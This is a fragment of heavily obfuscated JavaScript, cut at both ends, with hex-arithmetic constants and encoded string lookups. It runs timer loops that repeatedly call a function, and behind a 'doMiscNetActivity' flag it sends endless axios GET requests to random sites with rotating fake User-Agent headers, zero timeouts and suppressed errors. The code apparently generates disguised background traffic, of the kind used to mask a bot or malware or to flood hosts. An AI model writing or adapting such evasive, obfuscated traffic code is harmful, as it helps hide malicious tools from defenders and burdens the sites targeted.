  setInterval(() => {
    f();
    for (let l = 0x13ba + -0xcf7 * 0x3 + 0x132b; l < 0x116a + -0x1877 + 0x711; l++)
      setTimeout(f, (0x471 + 0x1b6f3 + -0xd104) * l * getRandomInt(-0x48d + -0x4fd + 0x98b, -0x5 * -0x798 + -0xc62 + -0x1993));
  }, -0x474d69 + 0x31c3 * 0x51 + 0x6e7d36);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const a3 = b,
    f = axios['create']({
      'headers': {
        'User-Agent': userAgents['random']()
      }
    });
  f['get'](miscSites[a3(0x11, 'Pd^)')](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x1383 + 0x1aff + 0xa4 * 0x1f) * getRandomInt(0x43b * 0x5 + 0x9b3 + 0x35 * -0x95, -0x1ac9 * 0x1 + 0x347 * 0x1 + 0x13 * 0x13d));
}, 0x1fed + -0x10dd * -0x2 + -0x15c1 * 0x3);